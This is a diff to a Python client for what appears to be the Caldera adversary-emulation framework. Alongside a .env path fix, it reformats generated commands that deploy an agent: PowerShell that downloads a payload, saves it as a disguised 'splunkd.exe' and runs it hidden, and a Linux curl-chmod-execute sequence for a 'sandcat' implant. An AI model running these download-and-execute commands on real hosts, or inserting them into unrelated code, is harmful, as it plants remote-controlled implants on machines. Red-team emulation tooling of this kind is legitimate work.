@@ -2,13 +2,14 @@
 import os
 import logging
 import re
+from pathlib import Path
 from urllib.parse import urlparse, urlunparse
 from typing import Any
 
 import requests
 from dotenv import load_dotenv
 
-load_dotenv()
+load_dotenv(Path(__file__).resolve().parents[1] / ".env")
 
 logging.basicConfig(level=logging.INFO)
 log = logging.getLogger(__name__)
@@ -312,22 +313,22 @@ class CalderaClient:
 
         if "win" in str(platform or "").lower():
             return (
-                f"$server=\"{server}\";\n"
-                "$url=\"$server/file/download\";\n"
-                "$wc=New-Object System.Net.WebClient;\n"
-                "$wc.Headers.add(\"platform\",\"windows\");\n"
-                f"$wc.Headers.add(\"file\",\"{payload_name}\");\n"
-                "$data=$wc.DownloadData($url);\n"
-                "get-process | ? {$_.modules.filename -like \"C:\\Users\\Public\\splunkd.exe\"} | stop-process -f;\n"
-                "rm -force \"C:\\Users\\Public\\splunkd.exe\" -ea ignore;\n"
-                "[io.file]::WriteAllBytes(\"C:\\Users\\Public\\splunkd.exe\",$data) | Out-Null;\n"
+                f"$server=\"{server}\";"
+                "$url=\"$server/file/download\";"
+                "$wc=New-Object System.Net.WebClient;"
+                "$wc.Headers.add(\"platform\",\"windows\");"
+                f"$wc.Headers.add(\"file\",\"{payload_name}\");"
+                "$data=$wc.DownloadData($url);"
+                "get-process | ? {$_.modules.filename -like \"C:\\Users\\Public\\splunkd.exe\"} | stop-process -f;"
+                "rm -force \"C:\\Users\\Public\\splunkd.exe\" -ea ignore;"
+                "[io.file]::WriteAllBytes(\"C:\\Users\\Public\\splunkd.exe\",$data) | Out-Null;"
                 f"Start-Process -FilePath C:\\Users\\Public\\splunkd.exe -ArgumentList \"-server $server -group {group}\" -WindowStyle hidden;"
             )
 
         return (
-            f"server='{server}'\n"
-            f"curl -fsSL -H 'file:{payload_name}' -H 'platform:linux' \"$server/file/download\" -o sandcat\n"
-            f"chmod +x sandcat\n"
+            f"server='{server}'; "
+            f"curl -fsSL -H 'file:{payload_name}' -H 'platform:linux' \"$server/file/download\" -o sandcat; "
+            f"chmod +x sandcat; "
             f"./sandcat -server \"$server\" -group {group}"
         )
 
